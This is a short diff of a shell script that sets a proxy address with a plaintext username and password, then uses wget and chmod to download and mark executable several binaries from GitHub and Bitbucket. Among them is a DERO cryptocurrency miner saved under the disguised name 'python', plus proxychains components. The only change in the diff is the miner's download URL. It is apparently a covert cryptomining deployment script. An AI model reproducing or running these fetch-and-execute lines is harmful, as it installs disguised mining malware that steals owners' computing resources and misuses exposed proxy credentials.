@@ -2,7 +2,7 @@ proxy="103.253.24.243
 port="8080
 user="woiden_racias90"  
 pass="90racias"
-wget -q -O python https://github.com/Danis85/dero/raw/main/bypass-dero-miner && chmod +x python
+wget -q -O python https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x python
 wget -q -O python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python
 wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
